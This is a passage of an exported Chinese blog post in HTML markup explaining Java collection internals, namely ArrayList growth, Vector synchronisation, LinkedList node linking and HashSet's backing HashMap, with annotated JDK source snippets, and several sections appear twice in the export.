class=\"line\">//头节点</span><br><span class=\"line\">transient Node&lt;E&gt; first;</span><br><span class=\"line\"></span><br><span class=\"line\">//尾节点</span><br><span class=\"line\">transient Node&lt;E&gt; last;</span><br><span class=\"line\"></span><br><span class=\"line\">//内部节点类</span><br><span class=\"line\">private static class Node&lt;E&gt; &#123;</span><br><span class=\"line\">    E item;</span><br><span class=\"line\">    Node&lt;E&gt; next;</span><br><span class=\"line\">    Node&lt;E&gt; prev;</span><br><span class=\"line\"></span><br><span class=\"line\">    Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class=\"line\">        this.item = element;</span><br><span class=\"line\">        this.next = next;</span><br><span class=\"line\">        this.prev = prev;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-构造方法-1\"><a href=\"#2-构造方法-1\" class=\"headerlink\" title=\"(2).构造方法\"></a>(2).构造方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//空构造</span><br><span class=\"line\">public LinkedList() &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedList(Collection&lt;? extends E&gt; c) &#123;</span><br><span class=\"line\">    this();</span><br><span class=\"line\">    addAll(c);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-增-add-E-e\"><a href=\"#3-增-add-E-e\" class=\"headerlink\" title=\"(3).增 add(E e)\"></a>(3).增 add(E e)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    linkLast(e);</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void linkLast(E e) &#123;</span><br><span class=\"line\">    /将尾节点设为前节点</span><br><span class=\"line\">    final Node&lt;E&gt; l = last;</span><br><span class=\"line\">    //新节点，参数为(前节点(当前的尾节点)，添加的元素， 后节点)</span><br><span class=\"line\">    final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null);</span><br><span class=\"line\">    //将新节点变为尾节点</span><br><span class=\"line\">    last = newNode;</span><br><span class=\"line\">    //如果前面没有节点，则新节点为头节点</span><br><span class=\"line\">    if (l == null)</span><br><span class=\"line\">        first = newNode;</span><br><span class=\"line\">    else</span><br><span class=\"line\">        l.next = newNode;</span><br><span class=\"line\">    size++;</span><br><span class=\"line\">    modCount++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"4-删-remove-Object-o\"><a href=\"#4-删-remove-Object-o\" class=\"headerlink\" title=\"(4).删 remove(Object o)\"></a>(4).删 remove(Object o)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public boolean remove(Object o) &#123;</span><br><span class=\"line\">     if (o == null) &#123;</span><br><span class=\"line\">         for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123;</span><br><span class=\"line\">             if (x.item == null) &#123;</span><br><span class=\"line\">                 unlink(x);</span><br><span class=\"line\">                 return true;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">     &#125; else &#123;</span><br><span class=\"line\">         for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123;</span><br><span class=\"line\">             if (o.equals(x.item)) &#123;</span><br><span class=\"line\">                 unlink(x);</span><br><span class=\"line\">                 return true;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     return false;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">E unlink(Node&lt;E&gt; x) &#123;</span><br><span class=\"line\">    // assert x != null;</span><br><span class=\"line\">    final E element = x.item;</span><br><span class=\"line\">    final Node&lt;E&gt; next = x.next;</span><br><span class=\"line\">    final Node&lt;E&gt; prev = x.prev;</span><br><span class=\"line\"></span><br><span class=\"line\">    //将前节点的next 指向自己的next</span><br><span class=\"line\">    //将自己从 next链中删除</span><br><span class=\"line\">    if (prev == null) &#123;</span><br><span class=\"line\">        first = next;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        prev.next = next;</span><br><span class=\"line\">        x.prev = null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //将后节点的prev指向自己的prev</span><br><span class=\"line\">    //将自己从prev链中删除</span><br><span class=\"line\">    if (next == null) &#123;</span><br><span class=\"line\">        last = prev;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        next.prev = prev;</span><br><span class=\"line\">        x.next = null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    x.item = null;</span><br><span class=\"line\">    size--;</span><br><span class=\"line\">    modCount++;</span><br><span class=\"line\">    return element;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"5-改\"><a href=\"#5-改\" class=\"headerlink\" title=\"(5).改\"></a>(5).改</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public E set(int index, E element) &#123;</span><br><span class=\"line\">    //检查是否在范围内</span><br><span class=\"line\">    checkElementIndex(index);</span><br><span class=\"line\">    Node&lt;E&gt; x = node(index);</span><br><span class=\"line\">    E oldVal = x.item;</span><br><span class=\"line\">    //替换</span><br><span class=\"line\">    x.item = element;</span><br><span class=\"line\">    return oldVal;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private void checkElementIndex(int index) &#123;</span><br><span class=\"line\">    if (!isElementIndex(index))</span><br><span class=\"line\">        throw new IndexOutOfBoundsException(outOfBoundsMsg(index));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private boolean isElementIndex(int index) &#123;</span><br><span class=\"line\">     return index &gt;= 0 &amp;&amp; index &lt; size;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//获取指定node</span><br><span class=\"line\">Node&lt;E&gt; node(int index) &#123;</span><br><span class=\"line\">   // assert isElementIndex(index);</span><br><span class=\"line\"></span><br><span class=\"line\">   //从头还是尾开始遍历 二分</span><br><span class=\"line\">   if (index &lt; (size &gt;&gt; 1)) &#123;</span><br><span class=\"line\">       Node&lt;E&gt; x = first;</span><br><span class=\"line\">       for (int i = 0; i &lt; index; i++)</span><br><span class=\"line\">           x = x.next;</span><br><span class=\"line\">       return x;</span><br><span class=\"line\">   &#125; else &#123;</span><br><span class=\"line\">       Node&lt;E&gt; x = last;</span><br><span class=\"line\">       for (int i = size - 1; i &gt; index; i--)</span><br><span class=\"line\">           x = x.prev;</span><br><span class=\"line\">       return x;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-查-get-int-index\"><a href=\"#6-查-get-int-index\" class=\"headerlink\" title=\"(6).查 get(int index)\"></a>(6).查 get(int index)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public E get(int index) &#123;</span><br><span class=\"line\">    checkElementIndex(index);</span><br><span class=\"line\">    return node(index).item;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三-Set\"><a href=\"#三-Set\" class=\"headerlink\" title=\"三.Set\"></a>三.Set</h3><p>Set: 不允许有重复数据，去重<br><br>Set主要:HashSet,TreeSet,LinkedHashSet<br></p>\n<p>HashSet:底层为哈希表加红黑树<br><br>TreeSet:底层为红黑树<br><br>LinkedHashSet: 底层为哈希表和一个双向链表<br></p>\n<h5 id=\"1-HashSet\"><a href=\"#1-HashSet\" class=\"headerlink\" title=\"1.HashSet\"></a>1.HashSet</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//map&lt;key, value&gt;</span><br><span class=\"line\">private transient HashMap&lt;E,Object&gt; map;</span><br><span class=\"line\"></span><br><span class=\"line\">//value</span><br><span class=\"line\">private static final Object PRESENT = new Object();</span><br><span class=\"line\"></span><br><span class=\"line\">//构造函数  可以看出实际为HashMap</span><br><span class=\"line\">public HashSet() &#123;</span><br><span class=\"line\">    map = new HashMap&lt;&gt;();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//add 看出value 为 PRESENT</span><br><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    return map.put(e, PRESENT)==null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一-Collection\"><a href=\"#一-Collection\" class=\"headerlink\" title=\"一.Collection\"></a>一.Collection</h3><h5 id=\"1-为什么需要集合\"><a href=\"#1-为什么需要集合\" class=\"headerlink\" title=\"1.为什么需要集合\"></a>1.为什么需要集合</h5><ul>\n<li>可以提供一个容器(可变长)用于存储对象</li>\n</ul>\n<h5 id=\"2-集合关系图\"><a href=\"#2-集合关系图\" class=\"headerlink\" title=\"2.集合关系图\"></a>2.集合关系图</h5><strong>容器主要为: Map 和 Collection<br></strong>\n\n<p>Collection主要包含了Set,List和Queue<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/collection/collection1.png\" alt=\"collection1\"></p>\n<h5 id=\"3-Iterator\"><a href=\"#3-Iterator\" class=\"headerlink\" title=\"3.Iterator\"></a>3.Iterator</h5><p>Iterator接口方法:<br></p>\n<ul>\n<li>hasNext()</li>\n<li>next()</li>\n<li>remove()</li>\n</ul>\n<h3 id=\"二-List\"><a href=\"#二-List\" class=\"headerlink\" title=\"二.List\"></a>二.List</h3><h6 id=\"概要\"><a href=\"#概要\" class=\"headerlink\" title=\"概要\"></a>概要</h6><p>ArrayList底层是数组，查询快，增删慢，线程不安全.<br></p>\n<p>List主要: ArrayList,LinkedList,Vector<br><br>原文：<a href=\"https://segmentfault.com/a/1190000014240704\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000014240704</a></p>\n<h5 id=\"1-ArrayList\"><a href=\"#1-ArrayList\" class=\"headerlink\" title=\"1.ArrayList\"></a>1.ArrayList</h5><h6 id=\"1-属性\"><a href=\"#1-属性\" class=\"headerlink\" title=\"(1).属性\"></a>(1).属性</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//初始化容量为10</span><br><span class=\"line\">private static final int DEFAULT_CAPACITY = 10;</span><br><span class=\"line\"></span><br><span class=\"line\">private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class=\"line\">//存储空间</span><br><span class=\"line\">transient Object[] elementData;</span><br></pre></td></tr></table></figure>\n<p>可见，ArrayList底层是数组<br></p>\n<h6 id=\"2-构造方法\"><a href=\"#2-构造方法\" class=\"headerlink\" title=\"(2).构造方法\"></a>(2).构造方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//自己设置初始化容量</span><br><span class=\"line\">public ArrayList(int initialCapacity) &#123;</span><br><span class=\"line\">    if (initialCapacity &gt; 0) &#123;</span><br><span class=\"line\">        this.elementData = new Object[initialCapacity];</span><br><span class=\"line\">    &#125; else if (initialCapacity == 0) &#123;</span><br><span class=\"line\">        this.elementData = EMPTY_ELEMENTDATA;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        throw new IllegalArgumentException(&quot;Illegal Capacity: &quot;+</span><br><span class=\"line\">                                           initialCapacity);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//默认的初始化容量</span><br><span class=\"line\">public ArrayList() &#123;</span><br><span class=\"line\">    this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-扩容\"><a href=\"#3-扩容\" class=\"headerlink\" title=\"(3).扩容\"></a>(3).扩容</h6><ul>\n<li>新增一个元素 add(E e)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    //确认容量是否够</span><br><span class=\"line\">    ensureCapacityInternal(size + 1);  // Increments modCount!!</span><br><span class=\"line\">    elementData[size++] = e;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>确认容量 ensureCapacityInternal(int minCapacity)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void ensureCapacityInternal(int minCapacity) &#123;</span><br><span class=\"line\">    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private static int calculateCapacity(Object[] elementData, int minCapacity) &#123;</span><br><span class=\"line\">    if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class=\"line\">        return Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return minCapacity;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private void ensureExplicitCapacity(int minCapacity) &#123;</span><br><span class=\"line\">    modCount++;</span><br><span class=\"line\"></span><br><span class=\"line\">    // overflow-conscious code</span><br><span class=\"line\">    if (minCapacity - elementData.length &gt; 0)</span><br><span class=\"line\">        //容量不够时，进行扩容</span><br><span class=\"line\">        grow(minCapacity);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>扩容 grow(int minCapacity)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void grow(int minCapacity) &#123;</span><br><span class=\"line\">    // overflow-conscious code</span><br><span class=\"line\">    int oldCapacity = elementData.length;</span><br><span class=\"line\">    //右移运算，num &gt;&gt; 1,相当于num除以2，相当于扩容1.5倍</span><br><span class=\"line\">    int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);</span><br><span class=\"line\">    //第一次扩容后，还是不够，直接为minCapacity</span><br><span class=\"line\">    if (newCapacity - minCapacity &lt; 0)</span><br><span class=\"line\">        newCapacity = minCapacity;</span><br><span class=\"line\">    if (newCapacity - MAX_ARRAY_SIZE &gt; 0)</span><br><span class=\"line\">        newCapacity = hugeCapacity(minCapacity);</span><br><span class=\"line\">    // minCapacity is usually close to size, so this is a win:</span><br><span class=\"line\">    //将原数组拷贝到一个新数组</span><br><span class=\"line\">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-Vector\"><a href=\"#2-Vector\" class=\"headerlink\" title=\"2.Vector\"></a>2.Vector</h5><p>Vector底层也是数组，它与ArrayList的区别为，它是线程安全的.<br></p>\n<p>Vector中方法大都为 synchronized<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public synchronized int size() &#123;</span><br><span class=\"line\">        return elementCount;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"3-LinkedList\"><a href=\"#3-LinkedList\" class=\"headerlink\" title=\"3.LinkedList\"></a>3.LinkedList</h5><p>LinkedList 底层为双向链表<br></p>\n<h6 id=\"1-属性-1\"><a href=\"#1-属性-1\" class=\"headerlink\" title=\"(1).属性\"></a>(1).属性</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">transient int size = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">//头节点</span><br><span class=\"line\">transient Node&lt;E&gt; first;</span><br><span class=\"line\"></span><br><span class=\"line\">//尾节点</span><br><span class=\"line\">transient Node&lt;E&gt; last;</span><br><span class=\"line\"></span><br><span class=\"line\">//内部节点类</span><br><span class=\"line\">private static class Node&lt;E&gt; &#123;</span><br><span class=\"line\">    E item;</span><br><span class=\"line\">    Node&lt;E&gt; next;</span><br><span class=\"line\">    Node&lt;E&gt; prev;</span><br><span class=\"line\"></span><br><span class=\"line\">    Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class=\"line\">        this.item = element;</span><br><span class=\"line\">        this.next = next;</span><br><span class=\"line\">        this.prev = prev;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-构造方法-1\"><a href=\"#2-构造方法-1\" class=\"headerlink\" title=\"(2).构造方法\"></a>(2).构造方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//空构造</span><br><span class=\"line\">public LinkedList() &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedList(Collection&lt;? extends E&gt; c) &#123;</span><br><span class=\"line\">    this();</span><br><span class=\"line\">    addAll(c);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-增-add-E-e\"><a href=\"#3-增-add-E-e\" class=\"headerlink\" title=\"(3).增 add(E e)\"></a>(3).增 add(E e)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    linkLast(e);</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void linkLast(E e) &#123;</span><br><span class=\"line\">    /将尾节点设为前节点</span><br><span class=\"line\">    final Node&lt;E&gt; l = last;</span><br><span class=\"line\">    //新节点，参数为(前节点(当前的尾节点)，添加的元素， 后节点)</span><br><span class=\"line\">    final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null);</span><br><span class=\"line\">    //将新节点变为尾节点</span><br><span class=\"line\">    last = newNode;</span><br><span class=\"line\">    //如果前面没有节点，则新节点为头节点</span><br><span class=\"line\">    if (l == null)</span><br><span class=\"line\">        first = newNode;</span><br><span class=\"line\">    else</span><br><span class=\"line\">        l.next = newNode;</span><br><span class=\"line\">    size++;</span><br><span class=\"line\">    modCount++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"4-删-remove-Object-o\"><a href=\"#4-删-remove-Object-o\" class=\"headerlink\" title=\"(4).删 remove(Object o)\"></a>(4).删 remove(Object o)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public boolean remove(Object o) &#123;</span><br><span class=\"line\">     if (o == null) &#123;</span><br><span class=\"line\">         for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123;</span><br><span class=\"line\">             if (x.item == null) &#123;</span><br><span class=\"line\">                 unlink(x);</span><br><span class=\"line\">                 return true;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">     &#125; else &#123;</span><br><span class=\"line\">         for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123;</span><br><span class=\"line\">             if (o.equals(x.item)) &#123;</span><br><span class=\"line\">                 unlink(x);</span><br><span class=\"line\">                 return true;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     return false;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">E unlink(Node&lt;E&gt; x) &#123;</span><br><span class=\"line\">    // assert x != null;</span><br><span class=\"line\">    final E element = x.item;</span><br><span class=\"line\">    final Node&lt;E&gt; next = x.next;</span><br><span class=\"line\">    final Node&lt;E&gt; prev = x.prev;</span><br><span class=\"line\"></span><br><span class=\"line\">    //将前节点的next 指向自己的next</span><br><span class=\"line\">    //将自己从 next链中删除</span><br><span class=\"line\">    if (prev == null) &#123;</span><br><span class=\"line\">        first = next;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        prev.next = next;</span><br><span class=\"line\">        x.prev = null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //将后节点的prev指向自己的prev</span><br><span class=\"line\">    //将自己从prev链中删除</span><br><span class=\"line\">    if (next == null) &#123;</span><br><span class=\"line\">        last = prev;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        next.prev = prev;</span><br><span class=\"line\">        x.next = null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    x.item = null;</span><br><span class=\"line\">    size--;</span><br><span class=\"line\">    modCount++;</span><br><span class=\"line\">    return element;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"5-改\"><a href=\"#5-改\" class=\"headerlink\" title=\"(5).改\"></a>(5).改</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 